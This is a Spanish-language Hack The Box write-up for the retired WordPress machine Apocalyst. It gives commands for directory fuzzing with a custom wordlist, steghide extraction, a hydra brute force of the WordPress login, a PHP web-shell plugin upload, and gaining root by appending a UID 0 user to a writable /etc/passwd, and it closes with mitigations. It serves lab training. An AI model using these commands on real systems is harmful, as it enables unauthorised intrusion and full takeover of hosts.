---
machine: Apocalyst
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, wordpress, cewl, steghide, hydra, plugin-upload, passwd-writable]
---

# Apocalyst — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

WordPress donde el directorio oculto no sale con diccionarios: hay que **construir la wordlist** con `cewl` a partir del propio blog. La carpeta encontrada contiene una imagen con una lista dentro (`steghide`), y esa lista rompe el login de WordPress por fuerza bruta. Como administrador se sube un plugin con PHP para obtener shell. Para root, `/etc/passwd` es escribible y se añade un usuario con UID 0.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh  OpenSSH 7.2p2
80/tcp open  http Apache httpd 2.4.18
```

```bash
echo "<IP> apocalyst.htb" >> /etc/hosts
wpscan --url http://apocalyst.htb/ --enumerate u
```

`wpscan` lista el usuario `falaraki`. La enumeración de directorios con diccionarios estándar no encuentra nada relevante (`wp-admin`, `wp-content`, `wp-includes`).

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Wordlist a medida**:

```bash
cewl http://apocalyst.htb/ -w cewl.txt --with-numbers -d 3
wfuzz -c -w cewl.txt --hc 404 http://apocalyst.htb/FUZZ/
```

Aparece un directorio con nombre «de blog»; dentro hay una imagen.

2. **Esteganografía**:

```bash
steghide extract -sf <imagen>.jpg
# passphrase vacía
cat <fichero_extraido>
```

El fichero extraído es una lista de contraseñas.

3. **Fuerza bruta al login**:

```bash
hydra -l falaraki -P <lista> apocalyst.htb http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
```

4. **Shell por plugin**: como administrador de WordPress, se empaqueta un plugin con un `.php` que ejecuta una reverse shell, se sube desde el panel y se visita la ruta del plugin.

```bash
zip -r pwn.zip pwn.php
# Plugins → Añadir nuevo → Subir
curl "http://apocalyst.htb/wp-content/plugins/pwn/pwn.php?cmd=id"
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
ls -l /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd
```

Escribible por todos: se añade un usuario con UID 0 y hash conocido.

```bash
openssl passwd -1 -salt x pwned
echo 'pwned:$1$x$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

```text
root@apocalyst:~#
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Hostname obligatorio**: WordPress usa URL absoluta, así que sin `apocalyst.htb` en `/etc/hosts` los enlaces y el panel fallan.
- `cewl` con `-d 3` recoge suficiente texto; con profundidad 1 no aparece el directorio.
- `steghide` sin passphrase: pulsar Enter, no inventar una.
- En instalaciones con PAM moderno, un `/etc/passwd` escribible puede no bastar (hace falta entrada en `shadow`); en esta máquina sí funciona.

- El contenido del sitio es material para la wordlist: `cewl` encuentra lo que los diccionarios no tienen.
- Datos ocultos en imágenes (`steghide`) siguen siendo una técnica vigente en retos y en malas prácticas reales.
- Un `/etc/passwd` escribible es root inmediato, sin exploit.
- Mitigación: permisos 644 en `/etc/passwd`, MFA en el panel y usuarios de WordPress sin capacidad de subir plugins.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Actualizar el CMS, poner un WAF delante y revisar la integridad de los ficheros.

## Referencias

- [rop-stack](../../../knowledge/pwn/rop-stack.md)
